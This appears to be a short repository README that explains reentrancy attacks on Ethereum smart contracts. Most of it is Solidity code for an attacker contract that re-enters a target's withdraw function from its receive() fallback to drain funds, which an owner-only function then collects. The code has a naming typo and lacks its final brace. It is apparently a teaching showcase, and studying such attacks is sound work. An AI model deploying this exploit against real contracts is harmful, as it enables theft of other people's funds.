# reentrancy-attack
shocase of reentrancy attack 
A reentrancy attack is essentially us creating another smart contract to interact with the target contract. We first send an amount of eth to it and in the same function withdraw. 
Afterwards we withdraw again before the target contract has time to process the transaction. In the process we need a fallback function to use within the time frame of sending money and receiving money.
We use this fallback function so we can restart the process and the target contract fails to update the balance, allowing us to withdraw funds which do not belong to us.


interface reentancy {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract attack {
    address public owner;
    reentancy targetContract;
    uint targetValue = 1000000000000000;

    constructor(address _targetAddr) public {
        targetContract = reentrancy(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function doublefunction() public payable {
        require(msg.value >= targetValue);
        targetContract.donate.value(msg.value)(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call.value(totalBalance)("");
        require(sent, "");
        return sent;
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
          targetContract.withdraw(targetValue);
        }
    }
